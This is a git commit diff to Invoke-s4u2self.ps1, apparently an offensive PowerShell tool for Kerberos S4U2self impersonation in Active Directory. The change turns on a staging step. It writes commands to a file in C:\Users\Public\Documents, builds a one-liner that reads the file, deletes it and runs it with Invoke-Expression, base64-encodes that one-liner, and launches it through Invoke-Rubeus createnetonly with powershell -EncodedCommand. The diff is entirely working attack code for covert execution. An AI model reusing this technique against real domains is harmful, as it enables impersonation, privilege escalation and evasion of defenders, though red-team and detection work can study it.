33a0933c2db79e62730640cba72dba9acbdb2fdf
Rob <61951374+Leo4j@users.noreply.github.com>
2025-02-13 16:27:51 +0000

    Update Invoke-s4u2self.ps1

--- Invoke-s4u2self.ps1
+++ Invoke-s4u2self.ps1
@@ -255,11 +255,9 @@ Enter-PSSession -ComputerName $FQDNHostname
 		break
 	}
 	
-	#$commands | Out-File "C:\Users\Public\Documents\comm.txt"
-	#$finalcommand = '$comm = Get-Content -Path "C:\Users\Public\Documents\comm.txt" -Raw;Remove-Item -Path C:\Users\Public\Documents\comm.txt;Invoke-Expression($comm)'
-	#$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalcommand))
-
-	$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
+	$commands | Out-File "C:\Users\Public\Documents\comm.txt"
+	$finalcommand = '$comm = Get-Content -Path "C:\Users\Public\Documents\comm.txt" -Raw;Remove-Item -Path C:\Users\Public\Documents\comm.txt;Invoke-Expression($comm)'
+	$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalcommand))
   	
 	Invoke-Rubeus createnetonly /program:"c:\windows\system32\cmd.exe /c powershell.exe -noexit -NoProfile -EncodedCommand $encodedCommand" /show > $null
 	
